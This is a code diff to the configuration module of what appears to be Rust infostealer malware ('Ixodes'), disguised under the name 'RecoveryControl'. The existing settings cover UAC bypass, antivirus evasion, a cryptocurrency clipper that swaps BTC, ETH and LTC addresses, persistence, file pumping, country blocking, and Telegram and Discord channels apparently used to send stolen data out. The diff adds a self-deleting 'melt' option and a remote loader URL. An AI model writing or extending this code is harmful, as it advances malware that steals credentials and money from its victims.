@@ -17,6 +17,7 @@ pub struct RecoveryControl {
     uac_bypass_enabled: bool,
     evasion_enabled: bool,
     clipper_enabled: bool,
+    melt_enabled: bool,
     btc_address: Option<String>,
     eth_address: Option<String>,
     ltc_address: Option<String>,
@@ -29,6 +30,7 @@ pub struct RecoveryControl {
     telegram_token: Option<String>,
     telegram_chat_id: Option<String>,
     discord_webhook: Option<String>,
+    loader_url: Option<String>,
     persistence_enabled: bool,
     #[allow(dead_code)]
     pump_size_mb: u32,
@@ -97,6 +99,10 @@ impl RecoveryControl {
         self.clipper_enabled
     }
 
+    pub fn melt_enabled(&self) -> bool {
+        self.melt_enabled
+    }
+
     pub fn btc_address(&self) -> Option<&str> {
         self.btc_address.as_deref()
     }
@@ -145,6 +151,10 @@ impl RecoveryControl {
         self.discord_webhook.as_deref()
     }
 
+    pub fn loader_url(&self) -> Option<&str> {
+        self.loader_url.as_deref()
+    }
+
     fn from_env() -> Self {
         let allowed_categories = env::var("IXODES_ENABLED_CATEGORIES")
             .ok()
@@ -181,6 +191,7 @@ impl RecoveryControl {
         let uac_bypass_enabled = parse_flag("IXODES_UAC_BYPASS").unwrap_or(DEFAULT_UAC_BYPASS);
         let evasion_enabled = parse_flag("IXODES_EVASION").unwrap_or(DEFAULT_EVASION_ENABLED);
         let clipper_enabled = parse_flag("IXODES_CLIPPER").unwrap_or(DEFAULT_CLIPPER_ENABLED);
+        let melt_enabled = parse_flag("IXODES_MELT").unwrap_or(DEFAULT_MELT_ENABLED);
 
         let btc_address = env::var("IXODES_BTC_ADDRESS")
             .ok()
@@ -237,6 +248,10 @@ impl RecoveryControl {
             .ok()
             .or_else(|| DEFAULT_DISCORD_WEBHOOK.map(String::from));
 
+        let loader_url = env::var("IXODES_LOADER_URL")
+            .ok()
+            .or_else(|| DEFAULT_LOADER_URL.map(String::from));
+
         RecoveryControl {
             allowed_categories,
             artifact_key,
@@ -246,6 +261,7 @@ impl RecoveryControl {
             uac_bypass_enabled,
             evasion_enabled,
             clipper_enabled,
+            melt_enabled,
             btc_address,
             eth_address,
             ltc_address,
@@ -258,6 +274,7 @@ impl RecoveryControl {
             telegram_token,
             telegram_chat_id,
             discord_webhook,
+            loader_url,
             persistence_enabled,
             pump_size_mb,
             blocked_countries,
